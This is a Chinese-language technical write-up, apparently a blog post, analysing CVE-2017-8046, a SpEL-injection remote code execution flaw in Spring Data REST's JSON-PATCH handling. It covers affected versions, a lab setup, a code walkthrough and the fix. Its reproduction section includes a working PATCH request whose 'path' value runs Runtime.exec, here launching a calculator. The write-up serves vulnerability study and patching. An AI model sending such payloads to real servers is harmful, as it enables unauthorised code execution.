# 简介

Spring Data REST的目的是消除CURD的模板代码，减少程序员的刻板的重复劳动，但实际上并没有很多人使用。很少有请求直接操作数据库的场景，至少也要做权限校验等操作。而Spring Data REST允许请求直接操作数据库，中间没有任何的业务逻辑

漏洞的原因是对PATCH方法处理不当，导致攻击者能够利用JSON数据造成RCE。本质还是因为Spring的SPEL解析导致的RCE

# 影响版本

```
Spring Data REST versions < 2.5.12, 2.6.7, 3.0 RC3

Spring Boot version < 2.0.0M4

Spring Data release trains < Kay-RC3
```

不受影响的版本

```
Spring Data REST 2.5.12, 2.6.7, 3.0RC3

Spring Boot 2.0.0.M4

Spring Data release train Kay-RC3
```

# 环境搭建

使用Spring官方教程：https://github.com/spring-guides/gs-accessing-data-rest.git

修改一下SpringBoot版本

![image-20210908102848978]([SpEL]CVE-2017-8046/image-20210908102848978.png)

然后删掉`src/test/java`中的文件(不删除可能会因为缺少部分依赖而报错)

运行`AccessingDataRestApplication.java`,访问8080端口

![image-20210908181117877]([SpEL]CVE-2017-8046/image-20210908181117877.png)

# 漏洞复现

使用post新建用户

```http
POST /people HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type:application/json
Content-Length: 38

{"firstName":"san","lastName":"zhang"}
```

返回:
![image-20210908104654582]([SpEL]CVE-2017-8046/image-20210908104654582.png)

成功创建用户,然后使用PATCH发送数据(注意请求头中Content-Type: application/json-patch+json)

```http
PATCH /people/1 HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type:application/json-patch+json
Content-Length: 169

[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{99, 97, 108, 99, 46, 101, 120, 101}))/lastName", "value": "hacker" }]
```

弹出计算器

# PATCH

这里准确来说是指JSON-PATCH,主要是做一些修补

原本数据为:

```json
{
  "baz": "qux",
  "foo": "bar"
}
```

发送这样的PATCH请求：

```json
[
  { "op": "replace", "path": "/baz", "value": "boo" },
  { "op": "add", "path": "/hello", "value": ["world"] },
  { "op": "remove", "path": "/foo" }
]
```

一开始的数据就会变成：

```json
{
  "baz": "boo",
  "hello": ["world"]
}
```

可以这样简单理解：op是一种操作标识，比如增删改查；path是修改的key，value是修改的value

# 漏洞分析

JSON的处理是在`org.springframework.data.rest.webmvc.config.JsonPatchHandler:apply()`

这里调用了isJsonPatchRequest()方法来判断时候是JSON-PATCH请求

![image-20210908130917405]([SpEL]CVE-2017-8046/image-20210908130917405.png)

内部会有两个判断语句

- 请求方式为PATCH
- content-type=application/json-patch+json

![image-20210908132344457]([SpEL]CVE-2017-8046/image-20210908132344457.png)

然后进入applyPatch()方法![image-20210908132505145]([SpEL]CVE-2017-8046/image-20210908132505145.png)

这里的target成员为我们最开始设定的值

![image-20210908135717869]([SpEL]CVE-2017-8046/image-20210908135717869.png)

跟进getPatchOperations(),这里传入了我们的body流。跟进convert方法

![image-20210908132723171]([SpEL]CVE-2017-8046/image-20210908132723171.png)

这里对我们的body进行解析,取出了op命令,path等,这里path为我们的payload。取出path之后没有修改path,并将其和value传入了ReplaceOperation,跟进去

![image-20210908133001318]([SpEL]CVE-2017-8046/image-20210908133001318.png)

这里进行赋值,PatchOperation是一个抽象类,因为我们的命令为replace,所以我们实例化了一个它的子类ReplaceOperation

![image-20210908133408455]([SpEL]CVE-2017-8046/image-20210908133408455.png)

依次进入

![image-20210908134102425]([SpEL]CVE-2017-8046/image-20210908134102425.png)

处理 /

![image-20210908134117116]([SpEL]CVE-2017-8046/image-20210908134117116.png)

最后this.spelExpression为这样一个SpelExpress对象

![image-20210908134336975]([SpEL]CVE-2017-8046/image-20210908134336975.png)

回到convert方法,这里添加到了ops,然后返回一个Pacth对象

![image-20210908134541413]([SpEL]CVE-2017-8046/image-20210908134541413.png)

![image-20210908134647487]([SpEL]CVE-2017-8046/image-20210908134647487.png)

回到applyPatch方法,进入apply

![image-20210908140755551]([SpEL]CVE-2017-8046/image-20210908140755551.png)

跟进setValueOnTarget

![image-20210908141408038]([SpEL]CVE-2017-8046/image-20210908141408038.png)

这里调用了setValue触发漏洞

![image-20210908141604874]([SpEL]CVE-2017-8046/image-20210908141604874.png)

# 漏洞修复

官方在evaluateValueFromTarget方法中对path参数值的路径进行合法性校验，若为非法内容则直接抛出错误。

![image-20210908143859302]([SpEL]CVE-2017-8046/image-20210908143859302.png)

# 参考

https://www.mi1k7ea.com/2019/04/05/Spring-Data-Rest%E4%B9%8Bcve-2017-8046%E5%88%86%E6%9E%90/#0x03-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90

https://xushao.ltd/post/cve-2017-8046-fen-xi/#%E7%AE%80%E4%BB%8B